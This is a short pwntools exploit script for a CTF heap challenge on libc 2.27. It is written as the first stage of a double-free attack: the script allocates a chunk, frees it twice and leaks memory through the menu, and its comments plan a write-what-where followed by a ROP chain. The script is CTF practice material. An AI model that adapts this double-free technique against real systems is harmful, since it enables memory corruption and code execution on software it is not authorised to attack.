#!/usr/bin/env python3

from pwn import *

# dump libc ld with libc-database and patch chall with patchelf
# https://drive.google.com/file/d/1wFNqzP44KBVJ1yu9HzFq2B0AF5j1f-eu/view
# https://faraz.faith/2019-10-20-secconctf-2019-one/

chall = './patched_chall'
lib = './libc-2.27.so'
r = process(chall)
elf = ELF(chall)
libc = ELF(lib)

# first leak an addr
# then www with heap double free
# enjoy the r0p

choice = 'choice :\n'
entersize = 'enter the size\n'
enterdata = 'Enter data\n'

def add(size, data):
    r.recvuntil(choice)
    r.sendline('1')
    r.recvuntil(entersize)
    r.sendline(str(size))
    r.recvuntil(enterdata)
    r.sendline(data)

def view():
    r.recvuntil(choice)
    r.sendline('2')

def delete():
    r.recvuntil(choice)
    r.sendline('3')

def quit():
    r.recvuntil(choice)
    r.sendline('4')

def leak():
    add(88, p64(elf.sym['malloc']) + p64(elf.plt['puts']))
    delete()
    delete()
    view()
    leak = r.recvuntil(choice)
    print(leak)

leak()
